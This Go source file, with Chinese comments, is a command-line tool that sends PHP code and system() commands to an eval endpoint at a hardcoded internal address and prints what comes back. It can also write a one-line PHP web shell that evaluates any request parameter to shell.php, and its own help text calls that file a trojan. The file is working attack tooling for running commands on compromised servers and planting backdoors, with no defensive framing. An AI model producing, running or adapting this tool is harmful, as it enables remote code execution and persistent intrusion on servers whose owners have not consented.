package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

// 常量定义
const (
	userAgent   = `Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; cmn-TW) AppleWebKit/533.20.7 (KHTML, like Gecko) Version/3.0.5 Mobile/8B119 Safari/6533.20.7`
	contentType = "application/x-www-form-urlencoded"
	httpURL     = "http://10.10.10.16/eval.php"
)

// makeRequest 函数用于创建并发送 HTTP POST 请求
func makeRequest(payload string) (*http.Response, error) {
	req, err := http.NewRequest("POST", httpURL, strings.NewReader(payload))
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", contentType)

	client := &http.Client{}
	return client.Do(req) // 发送请求并返回响应
}

// handleError 函数用于处理错误，打印错误消息
func handleError(err error, message string) {
	if err != nil {
		fmt.Printf("%s: %v\n", message, err)
	}
	return
}

// executeCode 函数执行给定的 PHP 代码或系统命令
func executeCode(code string) {
	evalPayload := "cmd=" + code + ";"
	shellPayload := "cmd=system('" + code + "');" // 修改此行，修复字符串拼接问题
	fmt.Printf("%s\n%s\n", evalPayload, shellPayload)
	// 使用 makeRequest 发送 PHP 代码执行请求
	respEval, err := makeRequest(evalPayload)
	handleError(err, "请求执行代码失败")

	// 使用 makeRequest 发送系统命令执行请求
	respShell, err := makeRequest(shellPayload)
	handleError(err, "请求执行系统命令失败")

	// 延迟关闭响应体
	defer func(body io.ReadCloser) {
		err := body.Close()
		handleError(err, "关闭响应失败")
	}(respEval.Body)

	defer func(body io.ReadCloser) {
		err := body.Close()
		handleError(err, "关闭响应失败")
	}(respShell.Body)

	// 读取和打印 PHP 代码执行响应
	bodyEval, err := io.ReadAll(respEval.Body)
	handleError(err, "读取响应体失败")

	// 读取和打印系统命令执行响应
	bodyShell, err := io.ReadAll(respShell.Body)
	handleError(err, "读取响应体失败")

	if string(bodyEval) != "" {
		fmt.Println("执行代码响应:")
		fmt.Println(string(bodyEval))
	}

	if string(bodyShell) != "" {
		fmt.Println("执行系统命令响应:")
		fmt.Println(string(bodyShell))
	}
}

func generateWebShell() {
	text := `<?php eval($_REQUEST['shell']);`
	filename := `shell.php`
	file, err := os.Create(filename)
	handleError(err, "创建文件时出错!")
	io.WriteString(file, text)
	{
		handleError(err, "写入文件出错")
	}
	fmt.Printf("生成文件成功!文件名:%s\n", filename)
}

// printLogo 函数用于打印程序的 Logo 和帮助信息
func printLogo() {
	logo := `
  ____            _    
 / ___| ___   ___| | __
| |  _ / _ \ / __| |/ /
| |_| | (_) | (__|   < 
 \____|\___/ \___|_|\_\
`
	fmt.Printf("%s\n", logo)
	fmt.Println("--help\t显示完整帮助信息\n--cmd\t输入要执行的 PHP 代码(省略`;`)\n--shell\t利用 system 函数执行系统命令\n--generate-shell\t生成简单的web_shell")
}

func main() {
	showHelp := flag.Bool("help", false, "显示帮助信息")
	code := flag.String("cmd", "", "执行 PHP 代码")
	shell := flag.String("shell", "", "利用system函数执行系统命令")
	webShell := flag.Bool("generate-shell", false, "生成php的一句话木马")

	flag.Parse()

	if *showHelp {
		printLogo()
	} else if *code != "" {
		executeCode(*code)
	} else if *shell != "" {
		executeCode(*shell)
	} else if *webShell {
		generateWebShell()
	} else {
		fmt.Println("未提供任何命令或选项。使用 --help 以获取帮助信息。")
	}
}
